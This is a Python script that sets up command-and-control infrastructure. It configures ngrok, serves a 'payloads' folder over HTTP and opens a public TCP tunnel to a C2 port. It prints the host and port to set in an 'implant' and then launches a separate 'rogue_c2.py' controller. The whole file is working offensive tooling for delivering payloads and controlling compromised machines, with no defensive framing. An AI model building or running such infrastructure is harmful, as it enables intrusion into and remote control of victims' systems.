#!/usr/bin/env python3
import subprocess
import time
import os
import requests
import threading

# === CONFIG ===
NGROK_AUTH_TOKEN = "your-ngrok-auth-token"
USE_NGROK_TCP = True         # ← Paid user toggle: True = use TCP for C2, False = http payloads only
PAYLOAD_PORT = 8000
C2_PORT = 4444
NGROK_API = "http://127.0.0.1:4040/api/tunnels"
C2_FILE = os.path.abspath("rogue_c2.py")

def install_ngrok_token():
    print("[*] Setting ngrok auth token...")
    try:
        subprocess.run(["ngrok", "config", "add-authtoken", NGROK_AUTH_TOKEN], check=True)
    except subprocess.CalledProcessError:
        print("[!] Could not set ngrok token. Is ngrok installed?")
        exit(1)

def start_payload_server():
    payload_path = os.path.join(os.getcwd(), "payloads")
    if not os.path.exists(payload_path):
        print("[!] 'payloads/' folder not found.")
        return
    os.chdir(payload_path)
    subprocess.Popen(["python3", "-m", "http.server", str(PAYLOAD_PORT)], stdout=subprocess.DEVNULL)
    print(f"[+] Payload HTTP server running on port {PAYLOAD_PORT}")

def start_ngrok_http():
    subprocess.Popen(["ngrok", "http", str(PAYLOAD_PORT)], stdout=subprocess.DEVNULL)
    time.sleep(5)
    try:
        response = requests.get(NGROK_API).json()
        for tunnel in response.get("tunnels", []):
            if tunnel["proto"] == "https":
                return tunnel["public_url"]
    except Exception as e:
        print(f"[!] Error retrieving HTTP ngrok tunnel: {e}")
    return None

def start_ngrok_tcp():
    subprocess.Popen(["ngrok", "tcp", str(C2_PORT)], stdout=subprocess.DEVNULL)
    time.sleep(5)
    try:
        response = requests.get(NGROK_API).json()
        for tunnel in response.get("tunnels", []):
            if tunnel["proto"] == "tcp":
                return tunnel["public_url"]
    except Exception as e:
        print(f"[!] Error retrieving TCP ngrok tunnel: {e}")
    return None

def start_rogue_c2():
    if not os.path.isfile(C2_FILE):
        print(f"[!] Could not find rogue_c2.py at {C2_FILE}")
        return
    print("[*] Launching Rogue C2...")
    subprocess.run(["python3", C2_FILE])

def main():
    if NGROK_AUTH_TOKEN == "your-ngrok-auth-token":
        print("[!] Replace NGROK_AUTH_TOKEN with your real token.")
        return

    install_ngrok_token()

    if USE_NGROK_TCP:
        print("[*] Launching TCP ngrok tunnel for full C2 access...")
        public_tcp = start_ngrok_tcp()
        if public_tcp:
            hostport = public_tcp.replace("tcp://", "")
            host, port = hostport.split(":")
            print(f"\n[NGROK] TCP C2 Tunnel Ready: {public_tcp}")
            print(f"[→] Set this in your implant as:\n\n    C2_HOST = '{host}'\n    C2_PORT = {port}\n")
        else:
            print("[!] Failed to retrieve TCP ngrok tunnel.")

    else:
        print("[*] Starting payload HTTP server...")
        threading.Thread(target=start_payload_server, daemon=True).start()

        print("[*] Launching HTTP ngrok tunnel for payload delivery...")
        public_http = start_ngrok_http()
        if public_http:
            print(f"\n[NGROK] HTTPS Payload Tunnel Ready: {public_http}")
            print(f"[→] Set this in your implant as:\n\n    PAYLOAD_REPO = '{public_http}/'\n")
        else:
            print("[!] Failed to retrieve HTTP ngrok tunnel.")

    start_rogue_c2()

if __name__ == "__main__":
    main()
